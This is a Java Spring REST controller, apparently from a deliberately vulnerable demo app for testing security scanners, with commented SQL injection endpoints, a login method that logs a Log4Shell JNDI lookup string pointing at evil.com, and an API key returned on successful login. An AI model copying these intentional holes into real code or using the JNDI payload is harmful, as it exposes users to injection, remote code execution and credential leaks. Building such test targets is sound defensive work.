package com.example.vulnerable.controller;

import com.example.vulnerable.model.User;
import com.example.vulnerable.service.UserService;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.List;

@RestController
@RequestMapping("/api/users")
public class UserController {

    private static final Logger logger = LogManager.getLogger(UserController.class);

    @Autowired
    private UserService userService;

    @GetMapping
    public ResponseEntity<List<User>> getAllUsers() {
        return ResponseEntity.ok(userService.getAllUsers());
    }

    @GetMapping("/{id}")
    public ResponseEntity<User> getUserById(@PathVariable Long id) {
        User user = userService.getUserById(id);
        if (user != null) {
            return ResponseEntity.ok(user);
        }
        return ResponseEntity.notFound().build();
    }

    // Vulnerable endpoint: SQL injection
    @GetMapping("/search")
    public ResponseEntity<List<User>> searchUsers(@RequestParam String username) {
        // SAST Vulnerability: User input directly passed to SQL query
        logger.info("Searching for user: " + username);
        List<User> users = userService.searchUsersByName(username);
        return ResponseEntity.ok(users);
    }

    // Vulnerable endpoint: SQL injection
    @GetMapping("/role/{role}")
    public ResponseEntity<List<User>> getUsersByRole(@PathVariable String role) {
        // SAST Vulnerability: Path variable used in SQL without sanitization
        List<User> users = userService.searchUsersByRole(role);
        return ResponseEntity.ok(users);
    }

    @PostMapping
    public ResponseEntity<User> createUser(@RequestBody User user) {
        User created = userService.createUser(user);
        return ResponseEntity.ok(created);
    }

    // Vulnerable authentication endpoint
    @PostMapping("/login")
    public ResponseEntity<String> login(@RequestParam String username, @RequestParam String password) {
        // Log4Shell vulnerability: logging user input
        logger.info("User login attempt: ${jndi:ldap://evil.com/a} " + username);

        boolean authenticated = userService.authenticateUser(username, password);
        if (authenticated) {
            return ResponseEntity.ok("Login successful. API Key: " + userService.getApiKey());
        }
        return ResponseEntity.status(401).body("Invalid credentials");
    }
}
